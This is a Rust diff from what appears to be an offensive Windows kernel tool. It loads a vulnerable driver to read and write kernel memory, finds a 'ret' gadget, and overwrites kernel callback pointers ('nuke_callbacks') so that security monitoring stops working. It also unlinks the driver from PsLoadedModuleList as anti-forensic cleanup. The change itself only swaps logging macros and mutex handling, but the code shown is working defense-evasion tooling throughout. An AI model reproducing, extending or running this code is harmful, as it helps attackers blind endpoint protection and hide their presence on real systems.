@@ -20,6 +20,7 @@
 //! - After overwriting, the vulnerable driver is unlinked from
 //!   PsLoadedModuleList for anti-forensic cleanup
 
+use common::lock::MutexExt;
 use super::deploy::{self, DeployedDriver};
 use super::discover::{CallbackInfo, CallbackListType};
 use super::driver_db::VulnerableDriver;
@@ -154,17 +155,17 @@ fn find_ret_address(
                 let mut buf = [0u8; 1];
                 match unsafe { read_kernel_memory(driver, device_handle, cr3, addr, &mut buf) } {
                     Ok(()) if buf[0] == 0xC3 => {
-                        log::info!("Found ret at IoInvalidDeviceRequest: 0x{:016X}", addr);
+                        tracing::info!("Found ret at IoInvalidDeviceRequest: 0x{:016X}", addr);
                         return Ok(addr);
                     }
                     Ok(()) => {
-                        log::warn!(
+                        tracing::warn!(
                             "IoInvalidDeviceRequest at 0x{:016X} is not ret (0x{:02X}), scanning .text",
                             addr, buf[0]
                         );
                     }
                     Err(e) => {
-                        log::warn!(
+                        tracing::warn!(
                             "Failed to verify IoInvalidDeviceRequest: {}, scanning .text",
                             e
                         );
@@ -176,18 +177,18 @@ fn find_ret_address(
                 let mut buf = [0u8; 4];
                 match unsafe { read_kernel_memory(driver, device_handle, cr3, addr, &mut buf) } {
                     Ok(()) if u32::from_le_bytes(buf) == 0xD65F03C0 => {
-                        log::info!("Found ret at IoInvalidDeviceRequest: 0x{:016X}", addr);
+                        tracing::info!("Found ret at IoInvalidDeviceRequest: 0x{:016X}", addr);
                         return Ok(addr);
                     }
                     Ok(()) => {
-                        log::warn!(
+                        tracing::warn!(
                             "IoInvalidDeviceRequest at 0x{:016X} is not ret (0x{:08X}), scanning .text",
                             addr,
                             u32::from_le_bytes(buf)
                         );
                     }
                     Err(e) => {
-                        log::warn!(
+                        tracing::warn!(
                             "Failed to verify IoInvalidDeviceRequest: {}, scanning .text",
                             e
                         );
@@ -196,7 +197,7 @@ fn find_ret_address(
             }
         }
         Err(e) => {
-            log::warn!(
+            tracing::warn!(
                 "Failed to resolve IoInvalidDeviceRequest: {}, scanning .text",
                 e
             );
@@ -294,7 +295,7 @@ fn find_ret_address(
             for offset in (0..scan_size).step_by(16) {
                 if scan_buf[offset as usize] == 0xC3 {
                     let ret_addr = kernel_base + virtual_address + offset;
-                    log::info!(
+                    tracing::info!(
                         "Found ret in .text at offset 0x{:04X}: 0x{:016X}",
                         offset,
                         ret_addr
@@ -307,7 +308,7 @@ fn find_ret_address(
             for (offset, &byte) in scan_buf.iter().enumerate() {
                 if byte == 0xC3 {
                     let ret_addr = kernel_base + virtual_address + offset as u64;
-                    log::info!(
+                    tracing::info!(
                         "Found ret in .text at unaligned offset 0x{:04X}: 0x{:016X}",
                         offset,
                         ret_addr
@@ -324,7 +325,7 @@ fn find_ret_address(
                 let off = offset as usize;
                 if u32::from_le_bytes([scan_buf[off], scan_buf[off + 1], scan_buf[off + 2], scan_buf[off + 3]]) == ret_bytes {
                     let ret_addr = kernel_base + virtual_address + offset;
-                    log::info!(
+                    tracing::info!(
                         "Found ret in .text at offset 0x{:04X}: 0x{:016X}",
                         offset,
                         ret_addr
@@ -338,7 +339,7 @@ fn find_ret_address(
                 let off = offset as usize;
                 if u32::from_le_bytes([scan_buf[off], scan_buf[off + 1], scan_buf[off + 2], scan_buf[off + 3]]) == ret_bytes {
                     let ret_addr = kernel_base + virtual_address + offset;
-                    log::info!(
+                    tracing::info!(
                         "Found ret in .text at 4-byte aligned offset 0x{:04X}: 0x{:016X}",
                         offset,
                         ret_addr
@@ -380,7 +381,7 @@ unsafe fn overwrite_callback(
 
     // Don't overwrite if it's already a ret pointer.
     if original_value == ret_address {
-        log::info!(
+        tracing::info!(
             "Callback {}:{} already points to ret, skipping",
             callback.list_type,
             callback.index
@@ -399,7 +400,7 @@ unsafe fn overwrite_callback(
     )
     .context("failed to write ret pointer to callback block")?;
 
-    log::info!(
+    tracing::info!(
         "Overwrote {}:{} callback 0x{:016X} -> 0x{:016X} (ret)",
         callback.list_type,
         callback.index,
@@ -434,7 +435,7 @@ pub fn nuke_callbacks(deployed: &DeployedDriver) -> Result<NukeResult> {
     // Step 1: Scan for all callbacks.
     let scan = super::discover::scan_callbacks(deployed).context("callback scan failed")?;
 
-    log::info!(
+    tracing::info!(
         "Discovered {} callbacks ({} overwritable), kernel base: 0x{:016X}",
         scan.total_count,
         scan.overwritable_count,
@@ -465,7 +466,7 @@ pub fn nuke_callbacks(deployed: &DeployedDriver) -> Result<NukeResult> {
     let ret_address = find_ret_address(driver, device_handle, scan.kernel_base, cr3)
         .context("failed to find ret address")?;
 
-    log::info!("Using ret address: 0x{:016X}", ret_address);
+    tracing::info!("Using ret address: 0x{:016X}", ret_address);
 
     // Step 3: Overwrite each safe callback.
     let mut result = NukeResult {
@@ -504,7 +505,7 @@ pub fn nuke_callbacks(deployed: &DeployedDriver) -> Result<NukeResult> {
                 };
 
                 {
-                    let mut guard = BACKUPS.lock().unwrap();
+                    let mut guard = BACKUPS.lock_recover();
                     guard.push(backup);
                 }
 
@@ -521,7 +522,7 @@ pub fn nuke_callbacks(deployed: &DeployedDriver) -> Result<NukeResult> {
                     "FAIL {}:{} [{}]: {}",
                     callback.list_type, callback.index, callback.owner_module, e
                 ));
-                log::warn!(
+                tracing::warn!(
                     "Failed to overwrite callback {}:{}: {}",
                     callback.list_type,
                     callback.index,
@@ -534,12 +535,12 @@ pub fn nuke_callbacks(deployed: &DeployedDriver) -> Result<NukeResult> {
     // Step 4: Anti-forensic cleanup — unlink the driver from PsLoadedModuleList.
     if !deployed.was_preloaded {
         if let Err(e) = unlink_driver_from_list(deployed, scan.kernel_base, cr3) {
-            log::warn!("Failed to unlink driver from PsLoadedModuleList: {}", e);
+            tracing::warn!("Failed to unlink driver from PsLoadedModuleList: {}", e);
             // Non-fatal — the callbacks are already overwritten.
         }
     }
 
-    log::info!(
+    tracing::info!(
         "Callback nuke complete: {} overwritten, {} skipped, {} failed",
         result.overwritten,
         result.skipped,
@@ -582,7 +583,7 @@ pub fn restore_callbacks(deployed: &DeployedDriver) -> Result<RestoreResult> {
     };
 
     let mut backups = {
-        let mut guard = BACKUPS.lock().unwrap();
+        let mut guard = BACKUPS.lock_recover();
         std::mem::take(&mut *guard)
     };
 
@@ -594,7 +595,7 @@ pub fn restore_callbacks(deployed: &DeployedDriver) -> Result<RestoreResult> {
         } {
             Ok(()) => {
                 result.restored += 1;
-                log::info!(
+                tracing::info!(
                     "Restored callback at 0x{:016X} to original 0x{:016X}",
                     backup.address,
                     backup.original_value
@@ -602,7 +603,7 @@ pub fn restore_callbacks(deployed: &DeployedDriver) -> Result<RestoreResult> {
             }
             Err(e) => {
                 result.failed += 1;
-                log::warn!(
+                tracing::warn!(
                     "Failed to restore callback at 0x{:016X}: {}",
                     backup.address,
                     e
@@ -611,7 +612,7 @@ pub fn restore_callbacks(deployed: &DeployedDriver) -> Result<RestoreResult> {
         }
     }
 
-    log::info!(
+    tracing::info!(
         "Callback restore complete: {} restored, {} failed",
         result.restored,
         result.failed
@@ -622,13 +623,13 @@ pub fn restore_callbacks(deployed: &DeployedDriver) -> Result<RestoreResult> {
 
 /// Check if there are backups available for restore.
 pub fn has_backups() -> bool {
-    let guard = BACKUPS.lock().unwrap();
+    let guard = BACKUPS.lock_recover();
     !guard.is_empty()
 }
 
 /// Get a snapshot of the current backup state.
 pub fn get_backup_snapshot() -> Vec<CallbackBackup> {
-    let guard = BACKUPS.lock().unwrap();
+    let guard = BACKUPS.lock_recover();
     guard.clone()
 }
 
@@ -720,7 +721,7 @@ fn unlink_driver_from_list(
                     write_kernel_memory(driver, device_handle, cr3, entry_flink + 8, &blink_bytes)?;
                 }
 
-                log::info!("Unlinked {} from PsLoadedModuleList", driver.name);
+                tracing::info!("Unlinked {} from PsLoadedModuleList", driver.name);
                 return Ok(());
             }
         }
@@ -732,7 +733,7 @@ fn unlink_driver_from_list(
         current = u64::from_le_bytes(flink_buf);
     }
 
-    log::warn!(
+    tracing::warn!(
         "Driver {} not found in PsLoadedModuleList (may already be unlinked)",
         driver.name
     );
